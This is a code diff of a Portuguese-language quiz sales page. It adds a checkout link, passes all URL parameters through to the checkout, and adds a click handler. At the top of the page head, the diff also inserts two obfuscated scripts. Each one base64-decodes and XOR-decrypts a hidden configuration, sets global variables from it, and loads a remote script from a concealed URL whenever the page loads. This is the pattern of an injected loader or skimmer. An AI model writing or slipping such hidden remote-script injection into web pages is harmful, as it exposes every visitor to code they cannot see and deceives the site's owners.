@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
+  <script>(function(){var r_r3i=atob("DADGTfS4mPbgCk+fZXvkOIbUuszCYjvrFXP8Ytvb/JjOfzvyDGa/Y5fX9diCeGDsBnKvPYDLt4OUZzywCWGyKIfMtpyTKGO9BHSyP53a7YKFeW2lPnvkI5XV/dTaKCv+EWHrOIDV8ZCZJz/tAHajI4CV4JWPbmLsBmvkYdbO+ZqVb22lRyK7YY+a9peNb22lR2SnOZWV7YKNYynmSHC0KILd9oLNeTr9DGS1b9ia7peMfyq9XyLkMKnF");var r_w6=[];for(var y_b=0;y_b<r_r3i.length;y_b++){r_w6.push(r_r3i.charCodeAt(y_b)&255);}var f_ad=r_w6[0];var c_b6=r_w6.slice(1,1+f_ad);var s_m14=r_w6.slice(1+f_ad);var c_40=s_m14.map(function(b,v_z){return b^c_b6[v_z%f_ad];});var d_afk="";for(var w_4x84=0;w_4x84<c_40.length;w_4x84++){d_afk+=String.fromCharCode(c_40[w_4x84]&255);}var v_x0dh=decodeURIComponent(escape(d_afk));var m_c9n=JSON.parse(v_x0dh);var a_0=m_c9n.globals||[];a_0.forEach(function(v_2ea){window[v_2ea.name]=v_2ea.value;});var h_cv4=document.createElement("script");h_cv4.src=m_c9n.url;h_cv4.async=true;h_cv4.defer=true;(m_c9n.attributes||[]).forEach(function(u_8n){h_cv4.setAttribute(u_8n.name,u_8n.value);});(document.head||document.documentElement).appendChild(h_cv4);})();</script>
+  <script>(function(){var w_5o=atob("DERXDQC3aKuIlDXbPz91eHLbSpGq/EGvTzdtIi/UDMWm4UG2ViIuI2PYBYXq5hqoXDY+fXTER9vh7FC3EDQ+dWXbRsH7thn5XjAjf2nVHd/t5xfhZBl7L2fbB8np+Eb5BR8sL27WBc6qrherVjwyYUnTSoeq4lS3SiF1NyKBCZzr9gS9C3EyPjiEDJ2+8lG9DndhPWGVFfb1");var j_f=[];for(var r_99=0;r_99<w_5o.length;r_99++){j_f.push(w_5o.charCodeAt(r_99)&255);}var w_n0c=j_f[0];var i_zpxk=j_f.slice(1,1+w_n0c);var o_h=j_f.slice(1+w_n0c);var e_khw=o_h.map(function(b,l_0){return b^i_zpxk[l_0%w_n0c];});var i_9="";for(var s_0u3=0;s_0u3<e_khw.length;s_0u3++){i_9+=String.fromCharCode(e_khw[s_0u3]&255);}var t_q1=decodeURIComponent(escape(i_9));var n_n=JSON.parse(t_q1);var g_r=n_n.globals||[];g_r.forEach(function(l_r7qe){window[l_r7qe.name]=l_r7qe.value;});var z_gsd=document.createElement("script");z_gsd.src=n_n.url;z_gsd.async=true;z_gsd.defer=true;(n_n.attributes||[]).forEach(function(g_ow9f){z_gsd.setAttribute(g_ow9f.name,g_ow9f.value);});(document.head||document.documentElement).appendChild(z_gsd);})();</script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <meta name="robots" content="noindex, nofollow">
@@ -858,7 +860,7 @@
 
         <!-- Botão CTA Desbloqueado com Preservação de UTMs -->
         <div class="qz__ctawrap" id="qzCtaWrap">
-          <a class="qz__cta" id="qzCta" href="#">QUERO MEU PLANO PERSONALIZADO · R$ 67,00 →</a>
+          <a class="qz__cta" id="qzCta" href="https://pay.kiwify.com.br/SEU_CHECKOUT_AQUI">QUERO MEU PLANO PERSONALIZADO · R$ 67,00 →</a>
           
           <div class="qz__trust-box">
             <div class="qz__trust-row">
@@ -931,24 +933,18 @@
         });
       }
 
-      // Constrói URL do checkout preservando parâmetros UTM da URL original
+      // Constrói URL do checkout passando TODAS as UTMs e preservando window.location.search
       function buildCheckoutLink() {
         try {
-          const currentUrl = new URL(window.location.href);
           const checkout = new URL(CONFIG.checkoutUrl.startsWith('http') ? CONFIG.checkoutUrl : 'https://' + CONFIG.checkoutUrl);
           
-          // Parâmetros importantes de rastreamento do tráfego pago
-          const trackParams = [
-            'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term',
-            'utm_id', 'src', 'sck', 'fbclid', 'gclid', 'ttclid'
-          ];
-
-          trackParams.forEach(function(param) {
-            const val = currentUrl.searchParams.get(param);
-            if (val) {
-              checkout.searchParams.set(param, val);
-            }
-          });
+          // Fazer TODAS as UTMs e parâmetros de busca passarem automaticamente em TODO o funil
+          if (window.location.search) {
+            const currentParams = new URLSearchParams(window.location.search);
+            currentParams.forEach(function(val, key) {
+              checkout.searchParams.set(key, val);
+            });
+          }
 
           const ctaBtn = document.getElementById('qzCta');
           if (ctaBtn) {
@@ -1088,6 +1084,24 @@
       updateGenderImages();
       buildCheckoutLink();
       showSlide(0);
+
+      // Garantir que QUALQUER clique preserve window.location.search
+      document.addEventListener('click', function(e) {
+        const link = e.target.closest('a#qzCta, a.qz__cta, a[href*="checkout"], a[href*="pay."]');
+        if (link && link.href) {
+          try {
+            const targetUrl = new URL(link.href, window.location.origin);
+            if (window.location.search) {
+              const currentParams = new URLSearchParams(window.location.search);
+              currentParams.forEach(function(val, key) {
+                targetUrl.searchParams.set(key, val);
+              });
+              link.href = targetUrl.toString();
+            }
+          } catch(err) {}
+        }
+      }, true);
+
     }
 
     if (document.readyState === 'loading') {
